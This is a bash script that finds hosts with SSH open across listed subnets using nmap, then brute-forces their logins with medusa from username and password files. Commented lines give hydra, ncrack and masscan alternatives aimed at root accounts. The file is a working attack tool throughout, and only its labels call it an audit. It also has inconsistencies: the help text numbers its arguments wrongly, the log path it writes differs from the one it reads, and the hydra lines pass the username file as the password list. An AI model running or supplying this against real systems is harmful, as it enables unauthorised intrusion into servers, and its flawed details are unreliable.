# !/bin/bash
#
# +-----------------------------------------------+
# |               Keyboard_Walk.sh                |
# +-----------------------------------------------+
# |       A simple SSH host discovery and a       |
# |       pre-set password bruteforce tool.       |
# +-----------------------------------------------+
# 
# -------------------------------------------------
# COLOUR PRESETS 
# -------------------------------------------------
GRN='\033[1;32m'
LRED='\033[1;31m'
YLW='\033[1;33m'
NC='\033[0m' #nocolor
#
# -------------------------------------------------
# HELP FILE / ARGUMENTS NOT FOUND: N00b ALERT
# -------------------------------------------------
#
if [[ $# -eq 0 ]] ; then
    echo -e "${YLW}WARNING: The script expects 3 arguments:${NC}"
	echo -e "----------------------------------------------"
	echo -e "     1: [File] Name of the subnet file in the same directory;"
	echo -e "     2: [File] Name of the username file in the same directory;"
	echo -e "     3: [File] Name of the password file in the same directory;"
	echo -e "     3: [Flag] 0 - to Force Re-scan of hosts; 1 - to use previously identified scan results."
	echo -e ""
	echo -e "Required Tools:"
	echo -e "----------------------------------------------"
	echo -e "     nmap"
	echo -e "     medusa"
	echo -e ""
	echo -e "Usage Example:" 
	echo -e "----------------------------------------------"
	echo -e "     ./keyboard_walk subnet_file uname_file pass_file 0${NC}" 
    exit 0
fi
#
# -------------------------------------------------
# START PROCEDURE
# -------------------------------------------------
#
echo -e "${GRN}--[ Starting Keyboard Walk Script ]--${NC}"
#
# -------------------------------------------------
# SETTING ARGUMENTS
# -------------------------------------------------
#
subnet_file=$1
uname_file=$2
pword_file=$3
force_rescan=$4
DATE_FORM=`date +"%Y-%m-%d"` #date in the format we want YYYY-mm-dd
#
# -------------------------------------------------
# FIND PREREQUISITES
# -------------------------------------------------
#
# Check Subnet File
echo -e "${GRN}--[ Checking Prerequisites ]--${NC}"
if [ -f "$1" ]
then
        echo "Required 'subnet' File: Found."
else
        echo "Required 'subnet' File: Not Found. Aborting."
		exit 1
fi
#
# Check Uname File
if [ -f "$2" ]
then
        echo "Required 'uname' File: Found."
else
        echo "Required 'uname' File: Not Found. Aborting."
		exit 1
fi
#
# Check Password File
if [ -f "$3" ]
then
        echo "Required 'password' File: Found."
else
        echo "Required 'password' File: Not Found. Aborting."
		exit 1
fi
#
# Check Re-Scan Flag
if [ -f livehost_list ] && [ $force_rescan -eq 0 ]
then
    echo "Previous scan File: livehost_list Found & Force Rescan = ON. Deleting livehosts list."
	rm livehost_list
elif [ -f livehost_list ] && [ $force_rescan -eq 1 ]
then
	echo "Previous scan File: livehost_list Found & Force Rescan = OFF. Keeping livehosts list for next scan."
else 
	echo "No files from previous scan found."
fi
#
# -------------------------------------------------
# COUNT ALL
# -------------------------------------------------
#
# Count Subnets
echo -e "${LRED}Total Subnets Identified${NC}"
cat $1 | wc -l
#
# Count Uname
echo -e "${LRED}Usernames to Test per host${NC}"
cat $2 | wc -l
#
# Count Passwords
echo -e "${LRED}Passwords to Test per host${NC}"
cat $3 | wc -l
#
# -------------------------------------------------
# START KEYBOARDWALK AUDIT
# -------------------------------------------------
#
# Start MassScan 
echo -e "${GRN}--[ Discovering Live Hosts (nmap) ]--${NC}"
#
# Check force_rescan flag
if [ $force_rescan -eq 0 ]
then
	nmap -n -p 22 --max-retries 2 --open -iL $1 -oG - | awk '/Up$/{print $2}' >> livehost_list
else
	echo -e "Using old scan results"
fi
#
# Count IPs
echo -e "${LRED}Live IPs Found${NC}"
cat livehost_list | wc -l
#
# Start Crackin'
echo -e "${GRN}--[ Running Keyboard Walk Exploit Tool (medusa) ]--${NC}"
medusa -U $2 -P $3 -H livehost_list -M ssh -T10 -e ns -O log/scan.log
#
# End Procedure
echo -e "${GRN}--[ Ending Keyboard Walk Assessment Script ]--${NC}"
#
# -------------------------------------------------
# DISPLAY RESULTS
# -------------------------------------------------
#
echo -e ""
echo -e "----------------------------------------------"
echo -e "${YLW}LAST SCAN RESULTS:${NC}"
echo -e "----------------------------------------------"
more +/$DATE_FORM log/scan_log
#
# -------------------------------------------------
# ALTERNATIVES / TESTING
# -------------------------------------------------
#
# MassScan to replace NMAP
#   #masscan --rate 100 -c msconf -oG - | awk '/^Host:/ { print $2 }' >> livehost_list
#   #nmap -n -p 22 --open -iL $1 -oG - | awk '/Up$/{print $2}' >> livehost_list
#
# Hydra / NCRACK to replace MEDUSA
#   #hydra -V -l root -P $2 -e ns -t 5 -w 10 -f -M livehost_list ssh
#   #hydra -t5 -l root -P $2 -M livehost_list ssh
#   #ncrack -u root -P $2 -p 22 -iL livehost_list
#
# -------------------------------------------------
#                   [-END SCRIPT-]                 
# -------------------------------------------------
